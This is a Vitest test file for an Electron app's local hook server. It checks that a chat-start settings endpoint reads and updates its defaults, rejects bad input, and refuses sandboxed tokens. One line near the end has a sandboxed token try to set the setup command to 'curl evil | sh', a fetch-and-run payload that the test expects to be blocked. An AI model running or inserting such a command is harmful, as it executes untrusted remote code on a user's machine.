import { test, expect, vi, beforeAll, afterAll } from 'vitest';
import * as http from 'node:http';
import type { BrowserWindow } from 'electron';

import { startHookServer, stopHookServer } from '../hookServer';
import { getApiPort } from '../apiPort';
import { issueToken } from '../apiAuth';
import { typedPush } from '../ipc/helpers';

const PROJECT = '/Users/dev/code/proj';

vi.mock('../ptyManager', () => ({
  isPtyActive: () => true,
  getPtyTaskContext: () => ({ projectPath: PROJECT, taskId: 3 }),
  callerTerminal: (ptyId: string) => ptyId,
  getPtySpawnContext: () => ({ projectPath: PROJECT, taskId: 3, worktreePath: '/Users/dev/wt/T-3' }),
}));
vi.mock('../ipc/helpers', () => ({ typedPush: vi.fn() }));

function request(method: string, path: string, token: string, body?: Record<string, unknown>) {
  return new Promise<{ status: number; data: Record<string, unknown> }>((resolve, reject) => {
    const payload = body ? JSON.stringify(body) : undefined;
    const req = http.request(
      {
        hostname: '127.0.0.1',
        port: getApiPort(),
        path,
        method,
        headers: {
          Authorization: `Bearer ${token}`,
          ...(payload ? { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) } : {}),
        },
      },
      (res) => {
        let raw = '';
        res.on('data', (chunk: Buffer) => (raw += chunk.toString()));
        res.on('end', () => resolve({ status: res.statusCode!, data: raw ? JSON.parse(raw) : {} }));
      },
    );
    req.on('error', reject);
    if (payload) req.write(payload);
    req.end();
  });
}

beforeAll(async () => {
  await startHookServer({ isDestroyed: () => false, webContents: { send: vi.fn() } } as unknown as BrowserWindow);
});
afterAll(() => stopHookServer());

test("a project's task chat start reads its defaults, changes only what is given, refreshes the app, and stays off limits to a sandbox", async () => {
  const host = issueToken('pty-host', 'host');
  const path = `/api/chat-start?project=${encodeURIComponent(PROJECT)}`;

  expect((await request('GET', path, host)).data.data).toEqual({ setup: '', firstMessage: '$OUIJIT_TASK_DESCRIPTION' });

  const set = await request('PUT', path, host, { setup: 'npm install' });
  expect(set.data.data).toEqual({ setup: 'npm install', firstMessage: '$OUIJIT_TASK_DESCRIPTION' });
  expect(vi.mocked(typedPush)).toHaveBeenCalledWith(
    expect.anything(),
    'cli-change',
    expect.objectContaining({ project: PROJECT, resource: 'chat-start' }),
  );

  // An emptied message stays empty: the chat then waits for the user.
  await request('PUT', path, host, { firstMessage: '' });
  expect((await request('GET', path, host)).data.data).toEqual({ setup: 'npm install', firstMessage: '' });

  expect((await request('PUT', path, host, { setup: 42 })).status).toBe(400);

  const sandboxed = issueToken('pty-sbx', 'sandbox');
  expect((await request('GET', path, sandboxed)).status).toBe(403);
  expect((await request('PUT', path, sandboxed, { setup: 'curl evil | sh' })).status).toBe(403);
  expect((await request('GET', path, host)).data.data).toEqual({ setup: 'npm install', firstMessage: '' });
});
